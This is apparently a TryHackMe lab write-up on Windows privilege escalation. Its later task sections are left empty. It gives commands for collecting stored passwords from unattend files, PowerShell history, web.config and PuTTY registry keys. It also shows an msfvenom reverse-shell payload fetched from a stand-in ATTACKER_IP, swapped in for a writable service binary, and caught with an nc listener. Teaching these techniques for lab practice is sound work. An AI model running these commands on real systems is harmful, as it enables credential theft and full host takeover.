![image](https://user-images.githubusercontent.com/51442719/181646417-4f424c63-70c3-4715-9de6-c9021bae34dd.png)
## `VIP` - [Windows Privilege Escalation](https://tryhackme.com/jr/windowsprivesc20)
#### Learn the fundamentals of Windows privilege escalation techniques.

- [x] [Task 1  Introduction](#task-1--introduction)
- [x] [Task 2  Windows Privilege Escalation](#task-2--windows-privilege-escalation)
- [x] [Task 3  Harvesting Passwords from Usual Spots](#task-3--harvesting-passwords-from-usual-spots)
- [ ] [Task 4  Other Quick Wins](#task-4--other-quick-wins)
- [ ] [Task 5  Abusing Service Misconfigurations](#task-5--abusing-service-misconfigurations)
- [ ] [Task 6  Abusing dangerous privileges](#task-6--abusing-dangerous-privileges)
- [ ] [Task 7  Abusing vulnerable software](#task-7--abusing-vulnerable-software)
- [ ] [Task 8  Tools of the Trade](#task-8--tools-of-the-trade)
- [ ] [Task 9  Conclusion](#task-9--conclusion)


---

### (`SCM`) - Service Control Manager 
### (`DACL`) - Discretionary Access Control List 

---

## [Task 1  Introduction]()
#### During a penetration test, you will often have access to some Windows hosts with an unprivileged user. 
- Unprivileged users will hold limited access, including their files and folders only, and have no means to perform administrative tasks on the host, preventing you from having complete control over your target.
- This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.
- If you want to brush up on your skills first, you can have a look through the [`Windows Fundamentals Module`](https://tryhackme.com/module/windows-fundamentals) or the [`Hacking Windows Module`](https://tryhackme.com/module/hacking-windows-1).
 
 
---

## [Task 2  Windows Privilege Escalation]()
#### Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. 
- While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.
- Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. 

#### Depending on the situation, we might need to abuse some of the following weaknesses:
- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

#### Before jumping into the actual techniques, let's look at the different account types on a Windows system.

### Windows Users
#### Windows systems mainly have two kinds of users. 
- Depending on their access levels, we can categorise a user in one of the following groups:

| Administrators | These users have the most privileges. <br> They can change any system configuration parameter and access any file in the system. |
|:---:|:---:|
| **Standard Users** | These users can access the computer but only perform limited tasks. <br> Typically these users can not make permanent or essential changes to the system and are limited to their files. |

- Any user with administrative privileges will be part of the Administrators group. 
- On the other hand, standard users are part of the Users group.

- In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. <br> It has full access to all files and resources available on the host with even higher privileges than administrators. |
|:---:|:---:|
| **Local Service** | Default account used to run Windows services with "minimum" privileges. <br> It will use anonymous connections over the network. |
| **Network Service** | Default account used to run Windows services with "minimum" privileges. <br> It will use the computer credentials to authenticate through the network. |

- These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. 
- Still, in some situations, you may gain their privileges due to exploiting specific services.

---

## [Task 3  Harvesting Passwords from Usual Spots]()

- The easiest way to gain access to another user is to gather credentials from a compromised machine. 
- Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

#### This task will present some known places to look for passwords on a Windows system.

- Before going into the task, remember to click the Start Machine button. 
- You will be using the same machine throughout tasks 3 to 5. 
- If you are using the AttackBox, this is also a good moment to start it as you'll be needing it for the following tasks.

#### In case you prefer connecting to the target machine via RDP, you can use the following credentials:
- User: `thm-unpriv`
- Password: `Password321`

### Unattended Windows Installations
- When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. 
- These kinds of installations are referred to as unattended installations as they don't require user interaction. 

#### Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
 - `C:\Unattend.xml`
 - `C:\Windows\Panther\Unattend.xml`
 - `C:\Windows\Panther\Unattend\Unattend.xml`
 - `C:\Windows\system32\sysprep.inf`
 - `C:\Windows\system32\sysprep\sysprep.xml`

#### As part of these files, you might encounter credentials:
```cmd
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History
- Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. 
- This is useful for repeating commands you have used before quickly. 
- If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
> 💡  `Note`: The command above will only work from `cmd.exe`, as Powershell won't recognize `%userprofile%` as an environment variable. 
> To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. 


### Saved Windows Credentials
- Windows allows us to use other users' credentials. 
- This function also gives the option to save these credentials on the system. 

#### The command below will list saved credentials:
```cmd
cmdkey /list
```

#### While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
```cmd
runas /savecred /user:admin cmd.exe
```
### IIS Configuration
- Internet Information Services (IIS) is the default web server on Windows installations. 
- The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. 
- Depending on the installed version of IIS, we can find web.config in one of the following locations:
 - `C:\inetpub\wwwroot\web.config`
 - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

#### Here is a quick way to find database connection strings on the file:
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY
- PuTTY is an SSH client commonly found on Windows systems. 
- Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. 
- While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

#### To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

> 💡 `Note`: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. 
> - The stored proxy username should also be visible after running the command above.
- Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

### Answer the questions below
- A password for the julia.jones user has been left on the Powershell history. What is the password?
 > Answer format: **************

- A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
 > Answer format: *************

- There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
 > Answer format: ***{*******************}


- Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
 > Answer format: ************


---

## [Task 4  Other Quick Wins]()

### Windows Services
- Windows services are managed by the Service Control Manager (SCM). 
- The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
- Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. 
- It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. 
- Each service also specifies the user account under which the service will run.

#### To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:
```cmd
sc qc apphostsvc
```

- Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.
- Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. 

#### The DACL can be seen from Process Hacker (available on your machine's desktop):
> ![image](https://user-images.githubusercontent.com/51442719/181739901-21638625-ef67-47ae-84ad-1590a5043dce.png)

#### All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:
> ![image](https://user-images.githubusercontent.com/51442719/181739977-de6d032e-e13b-416d-b9b5-6ff09c3f650c.png)
- A subkey exists for every service in the system. 
- Again, we can see the associated executable on the `ImagePath` value and the account used to start the service on the ObjectName value. 
- If a DACL has been configured for the service, it will be stored in a subkey called Security. 
- As you have guessed by now, only administrators can modify such registry entries by default.

### Insecure Permissions on Service Executable
- If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
- To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. 

#### To start, we will query the service configuration using `sc`:
```cmd
sc qc WindowsScheduler
```
- We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`.

#### We then proceed to check the permissions on the executable:
```cmd
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
- And here we have something interesting. 
- The Everyone group has modify permissions (M) on the service's executable. 
- This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

#### Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
```cmd
python3 -m http.server
```

#### We can then pull the payload from Powershell with the following command:
```cmd
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

- Once the payload is in the Windows server, we proceed to replace the service executable with our payload. 
#### Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

```cmd
cd C:\PROGRA~2\SYSTEM~1\
```

```cmd
move WService.exe WService.exe.bkp
```

```cmd
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```

```cmd
icacls WService.exe /grant Everyone:F
```
```cmd
nc -lvp 4445
````

#### We start a reverse listener on our attacker machine:
- And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. 

#### Use the following commands from a cmd.exe command prompt:
```cmd
sc stop windowsscheduler
```
```cmd
sc start windowsscheduler
```

- `Note`: PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.
```cmd
nc -lvp 4445
```
- Go to svcusr1 desktop to retrieve a flag. 
- Don't forget to input the flag at the end of this task.

### Unquoted Service Paths
- When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
- When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. 
- By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
- As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine).
- The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "`C:\Program Files\RealVNC\VNC Server\vncserver.exe`", followed by the given parameters:

```cmd
sc qc "vncserver"
```

```cmd 
sc qc "disk sorter enterprise"
```

- When the SCM tries to execute the associated binary, a problem arises. 
- Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

| Command | Argument 1 | Argument 2 |
|:---:|:---:|:---:|
| C:\MyPrograms\Disk.exe | Sorter | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe | Enterprise\bin\disksrs.exe |  |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |  |  |

- This has to do with how the command prompt parses a command. 
- Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. 
- This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.


#### Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
- First, search for `C:\\MyPrograms\\Disk.exe`. 
- If it exists, the service will run this executable.
- If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. 
- If it exists, the service will run this executable.
- If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. 
- This option is expected to succeed and will typically be run in a default installation.

#### From this behaviour, the problem becomes evident. 
- If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.



---

## [Task 5  Abusing Service Misconfigurations]()

---

## [Task 6  Abusing dangerous privileges]()

---

## [Task 7  Abusing vulnerable software]()

---

## [Task 8  Tools of the Trade]()

---

## [Task 9  Conclusion]()
